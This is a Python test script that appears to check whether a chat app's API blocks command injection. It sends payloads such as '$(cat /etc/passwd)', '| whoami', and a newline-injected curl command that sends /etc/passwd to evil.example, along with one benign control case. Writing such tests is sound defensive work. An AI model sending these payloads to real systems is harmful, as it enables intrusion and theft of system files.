"""Command Injection payloads."""
import sys, os; sys.path.insert(0, os.path.dirname(__file__))
from _common import req, report, summary, BASE_URL, BOLD, CYAN, RESET

print(f'\n{BOLD}[04] COMMAND INJECTION — target: {CYAN}{BASE_URL}{RESET}')
print('─' * 55)

CASES = [
    ("Semicolon injection ; ls -la",
     'POST', '/api/auth/login',
     {'username': 'alice; ls -la', 'password': 'x',
      'device_id': 'ccc', 'device_name': 'x',
      'ecdsa_public_key': '{}', 'ecdh_public_key': '{}'},
     True),

    ("Pipe injection | whoami",
     'POST', '/api/auth/login',
     {'username': 'alice | whoami', 'password': 'x',
      'device_id': 'ccc', 'device_name': 'x',
      'ecdsa_public_key': '{}', 'ecdh_public_key': '{}'},
     True),

    ("Backtick command substitution `id`",
     'POST', '/api/auth/login',
     {'username': 'alice`id`', 'password': 'x',
      'device_id': 'ccc', 'device_name': 'x',
      'ecdsa_public_key': '{}', 'ecdh_public_key': '{}'},
     True),

    ("$() subshell injection",
     'POST', '/api/auth/login',
     {'username': '$(cat /etc/passwd)', 'password': 'x',
      'device_id': 'ccc', 'device_name': 'x',
      'ecdsa_public_key': '{}', 'ecdh_public_key': '{}'},
     True),

    ("Newline injection with curl exfil",
     'POST', '/api/auth/register',
     {'username': 'alice\ncurl http://evil.example/steal?d=$(cat /etc/passwd)',
      'password': 'Test@1234', 'device_id': 'ccc', 'device_name': 'x',
      'ecdsa_public_key': '{}', 'ecdh_public_key': '{}'},
     True),

    ("cmd.exe /c (Windows)",
     'GET', '/api/chat/users?q=alice%26cmd.exe+/c+dir', None, True),

    # Benign
    ("Username with hyphen (benign)",
     'POST', '/api/auth/login',
     {'username': 'alice-bob', 'password': 'Test@1234',
      'device_id': 'ccc', 'device_name': 'MyPhone',
      'ecdsa_public_key': '{}', 'ecdh_public_key': '{}'},
     False),
]

for label, method, path, body, expect_block in CASES:
    status, _ = req(method, path, body)
    payload = str(body.get('username', path)) if body else path
    report(label, status, expect_block, payload)

summary('Command Injection')
